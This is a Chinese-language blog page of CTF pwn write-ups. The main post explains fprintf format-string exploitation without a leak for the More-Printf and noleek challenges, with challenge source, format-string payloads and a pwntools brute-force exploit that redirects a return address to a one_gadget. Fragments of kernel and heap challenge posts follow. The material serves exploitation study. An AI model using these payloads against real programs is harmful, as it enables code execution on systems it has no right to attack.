    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/24/noleek-fprintf/" class="post-title-link" itemprop="url">noleek-fprintf</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-04-24 22:20:04" itemprop="dateCreated datePublished" datetime="2023-04-24T22:20:04+08:00">2023-04-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-05-24 13:11:21" itemprop="dateModified" datetime="2024-05-24T13:11:21+08:00">2024-05-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li><p><code>int fprintf(FILE *stream, const char *format, ...);</code></p>
<p><code>fprintf</code>函数的作用是将格式化的数据扔到指定的文件流里，其实际上是<code>vfprintf</code>函数的封装</p>
<p><code>printf</code>的功能其实等价于<code>fprintf(stdout, ...)</code>，且<code>printf</code>函数其实也是<code>vfprintf</code>函数的封装</p>
<p>所以<code>fprintf</code>和<code>printf</code>的区别其实很小，printf中能用的东西在这也能用</p>
</li>
<li><p>具体到<code>More-Printf</code>这题，<code>fprintf</code>往<code>/dev/null</code>里扔数据，这种情况及其类似情况就可以用<code>%n</code>来直接写四个字节，以及用<code>%?c</code>去输出巨多数据，估计是因为不用实际在标准输出里打印出来，所以速度快很多且不会crash</p>
</li>
<li><p><code>More-Printf</code>这题中有个很重要的知识点是宽度符<code>*</code>的使用，例如<code>printf(&quot;%*d&quot;, 5, 10);</code>，那么实际上会打印宽度为五个字节的整数’10’，简单地说，宽度符<code>*</code>也往后解析一个参数作为要打印数据的宽度，其跟<code>%10c</code>这种宽度指定没什么区别，不足的输出长度补充到10个字节，超过10个字节的输出也不会截断它，只是宽度符会往后解析一个参数。</p>
<p>也很重要的一点是宽度符也可以指定位置符号<code>$</code>，例如<code>%*8$d</code>，这种情况下<code>8</code>这个偏移是宽度符<code>*</code>的指定而不是说明符<code>d</code>的指定，也就是说其会解析格式化字符串的第8个参数来作为宽度，<code>d</code>则正常计算，有这一点就可以想到实际上可以指定栈上的某个值来作为宽度，直接输出那么多个字节的字符，再配合<code>n</code>来写入。这样的好处是不需要泄露一些地址的具体值就可以打印其对应的值</p>
</li>
<li><p>这一点也很重要，但是目前没写demo去理解其过程，所以可能存在某些细节错误：</p>
<blockquote>
<p>同样重要的是要注意，我们只能使用一个位置参数来修改堆栈上的值。</p>
<blockquote>
<p>fprintf 将在内部调用 vfprintf。当 vfprintf 遇到第一个位置参数 $ 时，它将所有需要的参数复制到内部缓冲区，在下一个位置参数 $ 上，它将获取那里的原始值而不是更改后的值。</p>
</blockquote>
</blockquote>
<p><code>%&lt;offset&gt;$&lt;specifier&gt;</code>这种表示法可以算是独出来的，其跟直接<code>%&lt;specifier&gt;</code>的形式不太一样，首先一个区别是上面提到的这点，然后是这种表示法不会影响到<code>%&lt;specifier&gt;</code>形式的计算，例如<code>printf(&quot;%d, %d&quot;, a, b);</code>，我们知道第一个<code>%d</code>解析的是格式化字符串的第一个参数，第二个<code>%d</code>解析的是格式化字符串的第二个参数，再往后的<code>%?</code>依次递增，但是在格式化字符串的任何位置插入<code>%&lt;offset&gt;$&lt;specifier&gt;</code>这种表示法的说明符都不会影响正常的<code>%&lt;specifier&gt;</code>这种形式的递增值，这样表述比较乱，举个例子来说，<code>printf(&quot;%d, %10$d, %d&quot;, a, b);</code>这样，格式化字符串中的<code>%10$d</code>不会影响它后面的那个<code>%d</code>的计数，那个<code>%d</code>还是会解析格式化字符串的第二个参数</p>
<p>关于”其会将对应值复制到内部缓冲区中，在下次用到这个值的时候不会再从堆栈上取，而是使用这个缓冲区中的值”这句话具体到题目来看</p>
</li>
</ol>
<h2 id="Zh3r0-CTF-More-Printf"><a href="#Zh3r0-CTF-More-Printf" class="headerlink" title="Zh3r0 CTF More-Printf"></a>Zh3r0 CTF More-Printf</h2><p><a target="_blank" rel="noopener" href="https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/">很好的WP</a></p>
<p>源码如下，环境是<code>glibc-2.27-3ubuntu1.4_amd64</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* gcc -o more-printf -fstack-protector-all more-printf.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">char</span> *buffer;</span><br><span class="line"><span class="keyword">uint64_t</span> i = <span class="number">0x8d9e7e558877</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">_Noreturn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Just to save some of your time */</span></span><br><span class="line">  <span class="keyword">uint64_t</span> *p;</span><br><span class="line">  p = &amp;p;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Chall */</span></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  buffer = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span> + <span class="number">1</span>);</span><br><span class="line">  fp = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  fgets(buffer, <span class="number">0x1f</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> (i != <span class="number">0x8d9e7e558877</span>) &#123;</span><br><span class="line">    _exit(<span class="number">1337</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    i = <span class="number">1337</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(fp, buffer);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码理解起来很简单，<code>p = &amp;p;</code>的作用其实就是在栈上放了一个可以很容易被操控的栈指针，从程序逻辑可知，当按照正常流程走了一次<code>fprintf</code>之后，<code>i</code>的值就已经被改变了，所以如果想要用某种方法再次返回到main的话也会在<code>if</code>那里挂掉，所以这题其实只提供了一次<code>fprintf</code>的机会</p>
<p>由此其实比较自然地能想到要改某个返回地址为<code>one_gadget</code>，而这个地址不会是<code>libc_start_main</code>，因为是<code>exit</code>结束的，也不会是<code>fprintf</code>的返回地址，因为它的返回地址是个PIE的程序段，很明显就只能是fprintf函数的内部调用链，最简单的就是<code>vfprintf</code>的返回地址，调试一下发现<code>vfprintf</code>的返回地址所在的栈地址跟<code>p</code>所在的地址相差<code>0xe0</code>个字节，所以是有机会爆破出来的</p>
<p>首先是调试出栈上的某些地址相对于<code>fprintf</code>格式化字符串的偏移，输入<code>%p%p%p%p%p%p%p%p</code>，然后断在<code>call vfprintf</code>处，把文件流参数改成stdout</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set $rdi=stdout</span><br></pre></td></tr></table></figure>

<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425203007009.png" alt="image-20230425203007009"></p>
<p>由此可以确定出<code>%1$ - %8$</code>偏移对应的地址，<code>%8$</code>对应<code>libc_start_main</code>的地址，<code>%5$</code>对应<code>p</code>的地址</p>
<p>难点在于如何在不泄露libc的情况下把<code>vfprintf</code>的返回地址改成<code>one_gadget</code>，虽然libc的低12位是固定的，但是它们的高位需要爆破，直接来爆成功率过低，所以这里就需要用到<code>*</code>宽度符来打印出<code>libc_start_main</code>的地址长度的字节，再打印出其与<code>one_gadget</code>的偏移（这个是固定的），然后再用<code>%n</code>去写四个字节到<code>fprintf</code>的返回地址中，这样需要爆破的点就少了很多</p>
<p>接下来来到有关<code>%?$</code>表达式的问题，以这个题目来进行测试，用如下payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%c%c%c%5c%hhn%5$n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>按照这个payload，<code>%5$n</code>是第一个偏移表达式，此时这个payload对栈的修改如下</p>
<p>第一个<code>%hhn</code>会把<code>p</code>的低位盖成<code>0x8</code>，然后<code>%5$n</code>会往修改之后的<code>p</code>指向的位置写四个字节的<code>8</code>（这也是正常情况），如下</p>
<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425200641896.png" alt="image-20230425200641896"></p>
<p>但是如果我在前面先用一个跟<code>p</code>一点关系都没有的<code>%?$</code>表达式呢？此时<code>%5$n</code>是第二个偏移表达式，其对栈的修改如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;%1$c%c%c%c%4c%hhn%5$n&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这样对比就很明显了，这里很明显是第二次的<code>%5$n</code>再次把原来的值给改了</p>
<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425200551010.png" alt="image-20230425200551010"></p>
<p>所以在用第一个<code>%?$</code>偏移表达式之前就需要先把<code>p</code>的低位覆盖成<code>0x8</code>，然后再用偏移表达式去改</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;ERROR&#x27;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x4f3d5</span>,<span class="number">0x4f432</span>,<span class="number">0x10a41c</span>]</span><br><span class="line">libc_base = <span class="number">0x7ffff79e2000</span></span><br><span class="line">og = libc_base + one[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%c%c%c%5c%hhn%*8$c%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x4f3d5</span> - (<span class="number">0x7f93a0892bf7</span> - <span class="number">0x7f93a0871000</span>) - <span class="number">8</span>) + <span class="string">b&#x27;c%5$n&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;./more-printf&#x27;</span>)</span><br><span class="line">		p.sendline(payload)</span><br><span class="line">		p.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">		p.recv()<span class="comment">#timeout=0.5)</span></span><br><span class="line">		p.interactive()</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<h2 id="angstromCTF-noleek"><a href="#angstromCTF-noleek" class="headerlink" title="ångstromCTF noleek"></a>ångstromCTF noleek</h2><p>比赛中给的docker的环境是<code>Debian GLIBC 2.31-13+deb11u5</code>的，我在本机复现时懒得搞环境了，就用了跟上一题一样的<code>glibc-2.27-3ubuntu1.4_amd64</code>来复现</p>
<h3 id="源码如下"><a href="#源码如下" class="headerlink" title="源码如下"></a>源码如下</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEEK 32</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cleanup</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    FILE* leeks = fopen(<span class="string">&quot;/dev/null&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (leeks == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wtf&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leek? &quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> inp[LEEK];</span><br><span class="line">    fgets(inp, LEEK, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(leeks, inp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;more leek? &quot;</span>);</span><br><span class="line">    fgets(inp, LEEK, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(leeks, inp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;noleek.\n&quot;</span>);</span><br><span class="line">    cleanup(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>这题跟上一题其实区别不大，只是这题给了两次<code>fprintf</code>，但是没给指向自身的那个<code>p</code>指针，有了上一题的经验就会很自然地想，第一个<code>fprintf</code>应该是用来做出一个可修改返回地址的指针来的，然后第二次<code>fprintf</code>就用来改返回地址</p>
<p>还是断在<code>call vfprintf</code>处看栈空间</p>
<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425234957377.png" alt="image-20230425234957377"></p>
<p>发现有一条可以用的链，配合<code>*</code>宽度符将其改成指向<code>libc_start_main</code>，然后就跟前面那题一模一样了，流程都一样就不说了</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/CharonPt/CharonPt.github.io.git/2023/04/24/noleek-fprintf/image-20230425233658664.png" alt="image-20230425233658664"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2023/03/26/Kernel/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/26/Kernel/" class="post-title-link" itemprop="url">Kernel</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-03-26 21:41:53 / 修改时间：23:39:04" itemprop="dateCreated datePublished" datetime="2023-03-26T21:41:53+08:00">2023-03-26</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id><a href="#" class="headerlink" title></a></h4><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这里整理一些有关于kernel的题目</p>
<h3 id="2021-0CTF-Final-kernote"><a href="#2021-0CTF-Final-kernote" class="headerlink" title="2021 0CTF Final - kernote"></a>2021 0CTF Final - kernote</h3><p>拿到手的压缩包解压后只有如下文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bzImage</span><br><span class="line">readme.md</span><br><span class="line">rootfs.img</span><br><span class="line">run.sh</span><br></pre></td></tr></table></figure>

<p>首先用<code>file</code>命令来查看<code>rootfs.img</code>文件所用的文件系统</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file rootfs.img</span> </span><br><span class="line">rootfs.img: Linux rev 1.0 ext4 filesystem data, UUID=1a11479a-9bca-4c78-ae24-9c9c0b41d9f4 (extents) (64bit) (large files) (huge files)</span><br></pre></td></tr></table></figure>

<p>可知属于ext4（常见的Linux文件系统包括ext2、ext3、ext4等，可以使用相应的命令来挂载）</p>
<p>用下面这个命令来将这个镜像文件挂载到<code>/mnt</code>文件夹中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t ext4 -o loop rootfs.img /mnt</span><br></pre></td></tr></table></figure>

<p>其实也可以直接mount</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount rootfs.img /mnt</span><br></pre></td></tr></table></figure>



<p>之后就可以在<code>/mnt</code>文件夹中访问这个镜像文件内的相关内容</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ls /mnt</span></span><br><span class="line">bin  dev  etc  flag  init  kernote.ko  linuxrc  lost+found  proc  sbin  sys  tmp  usr</span><br></pre></td></tr></table></figure>

<p>将驱动文件提取出来逆向</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/11/07/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/07/2022%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%88%9D%E8%B5%9B/" class="post-title-link" itemprop="url">2022强网拟态初赛</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-11-07 20:16:27" itemprop="dateCreated datePublished" datetime="2022-11-07T20:16:27+08:00">2022-11-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-11-11 18:53:28" itemprop="dateModified" datetime="2022-11-11T18:53:28+08:00">2022-11-11</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>初赛的pwn题总体来说还是比较简单，除了一道两解的解释器题目以外别的题目都不算很难（<del>因为知道这题肯定做不出来所以比赛时看都没看一眼</del>），其中有两道题目我觉得学到了挺多，所以在这记录一下</p>
<h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><p>题目简述：2.31的堆题，菜单增删改查都齐，漏洞是UAF，程序可以exit。我觉得比较新颖的是它用到的沙箱，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0e 0xc000003e  if (A != ARCH_X86_64) goto 0016</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024</span><br><span class="line"> 0005: 0x15 0x11 0x00 0x0000000c  if (A == brk) goto 0023</span><br><span class="line"> 0006: 0x15 0x10 0x00 0x00000000  if (A == read) goto 0023</span><br><span class="line"> 0007: 0x15 0x0f 0x00 0x00000001  if (A == write) goto 0023</span><br><span class="line"> 0008: 0x15 0x0e 0x00 0x00000005  if (A == fstat) goto 0023</span><br><span class="line"> 0009: 0x15 0x0d 0x00 0x0000000a  if (A == mprotect) goto 0023</span><br><span class="line"> 0010: 0x15 0x0c 0x00 0x0000003c  if (A == exit) goto 0023</span><br><span class="line"> 0011: 0x15 0x0b 0x00 0x0000005a  if (A == chmod) goto 0023</span><br><span class="line"> 0012: 0x15 0x0a 0x00 0x0000008c  if (A == getpriority) goto 0023</span><br><span class="line"> 0013: 0x15 0x09 0x00 0x0000008d  if (A == setpriority) goto 0023</span><br><span class="line"> 0014: 0x15 0x08 0x00 0x000000c0  if (A == lgetxattr) goto 0023</span><br><span class="line"> 0015: 0x15 0x07 0x08 0x000000e6  if (A == clock_nanosleep) goto 0023 else goto 0024</span><br><span class="line"> 0016: 0x15 0x00 0x07 0x40000003  if (A != ARCH_I386) goto 0024</span><br><span class="line"> 0017: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0018: 0x15 0x04 0x00 0x00000005  if (A == fstat) goto 0023</span><br><span class="line"> 0019: 0x15 0x03 0x00 0x0000005a  if (A == chmod) goto 0023</span><br><span class="line"> 0020: 0x15 0x02 0x00 0x0000008c  if (A == getpriority) goto 0023</span><br><span class="line"> 0021: 0x15 0x01 0x00 0x0000008d  if (A == setpriority) goto 0023</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x000000c0  if (A != lgetxattr) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>

<p>这部分放到后面重点说</p>
<p>add如下，最多两个堆指针，同时在<code>Heap[]</code>中的堆指针数小于2的情况下会申请两个相同大小的chunk，其中一个指针保存在<code>Heap[]</code>数组中，另一个保存在另一个数组里，这里有一个比较容易忽略的点在于即便<code>index &gt; 1</code>，也能申请出一个chunk出来，只是这个chunk的指针不会被记录，也不能往里面写内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> index; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="keyword">for</span> ( index = <span class="number">0</span>; index &lt;= <span class="number">1</span> &amp;&amp; Heap[index]; ++index )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( index &gt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;full!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      Heap[index] = v3;</span><br><span class="line">      Size[index] = size;</span><br><span class="line">      qword_4160[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, Heap[index], Size[index]);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Remark: &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, Heap2[index], Size[index]);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;success!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>delete中只会free掉<code>Heap[index]</code>数组中记录的chunk，不会去管另一个。edit能够分别往<code>Heap[index]、Heap2[index]</code>里的chunk里写内容。show用puts函数分别输出<code>Heap[index]、Heap2[index]</code>里的chunk的内容。</p>
